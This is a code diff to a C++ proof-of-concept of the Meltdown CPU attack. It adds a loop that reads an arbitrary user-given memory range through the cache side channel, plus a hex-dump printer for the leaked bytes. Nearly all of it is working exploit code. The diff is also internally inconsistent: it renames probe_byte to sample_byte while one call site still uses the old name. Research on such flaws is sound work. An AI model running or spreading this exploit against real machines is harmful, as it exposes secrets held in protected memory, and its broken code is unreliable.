@@ -7,8 +7,10 @@
 //
 //=============================================================================
 
+#include <vector>
 #include <array>
 #include <iostream>
+#include <iomanip>
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/mman.h>
@@ -91,8 +93,8 @@ probe_access_time(char const* address) {
 
 inline
 unsigned char
-probe_byte(size_t address, char * buffer) {
-  std::array<unsigned char,256> scores{};
+sample_byte(size_t address, char * buffer) {
+  std::array<unsigned char, 256> scores{};
   std::array<size_t, 256> access_times;
   size_t best = 0;
   
@@ -118,18 +120,38 @@ probe_byte(size_t address, char * buffer) {
   return (unsigned char)best;
 }
 
+template <typename Buffer>
+void
+pretty_print(size_t address, Buffer const& buffer) {
+  std::ios_base::fmtflags flags = std::cout.flags();
+  std::streamsize precision = std::cout.precision();
+  char fill = std::cout.fill();
+  std::string ascii;
+  std::cout << std::hex << std::internal << std::setfill('0')
+            << "0x" << std::setw(16) << address << " | ";
+  for (size_t i = 0; i < buffer.size(); ++i) {
+    std::cout << std::setw(2) << (int)buffer[i] << ((i + 1) == 8 ? "  " : " ");
+    ascii += (buffer[i] >= ' ' && buffer[i] <= '~') ? buffer[i] : '.';
+  }
+  std::cout << "| " << ascii << std::endl;
+  
+  std::cout.flags(flags);
+  std::cout.precision(precision);
+  std::cout.fill(fill);
+}
+
 int
 main(int argc, char* argv[]) {
-  static const char * usage = "usage: meltdown <address> <length>\ndanke intel!\n";
+  static const char * usage = "usage: meltdown <address> <length>\nDanke Intel!\n";
   size_t begin = (size_t)usage;
   size_t size = strlen(usage);
 
-  char probe_memory[256 * kPageSize];
+  std::array<char, 256 * kPageSize> probe_memory;
 
   if (argc != 3) {
     // leak our own usage message
     for (size_t i = 0; i < size; ++i) {
-      std::cerr << probe_byte(begin + i, probe_memory);
+      std::cerr << probe_byte(begin + i, probe_memory.data());
     }
     return EXIT_FAILURE;
   }
@@ -137,7 +159,22 @@ main(int argc, char* argv[]) {
   begin = strtoul(argv[1], nullptr, 16);
   size = strtoul(argv[2], nullptr, 10);
 
-  std::array<unsigned char, 16> buffer;
+  std::vector<unsigned char> buffer;
+  size_t address;
+  for (size_t i = 0; i < size; ++i) {
+    if (buffer.empty()) {
+      address = begin + i;
+    }
+    buffer.push_back(sample_byte(begin + i, probe_memory.data()));
+    if (buffer.size() == 16) {
+      pretty_print(address, buffer);
+      buffer.clear();
+    }
+  }
+  if (!buffer.empty()) {
+    pretty_print(address, buffer);
+    buffer.clear();
+  }
 
   return EXIT_SUCCESS;
 }
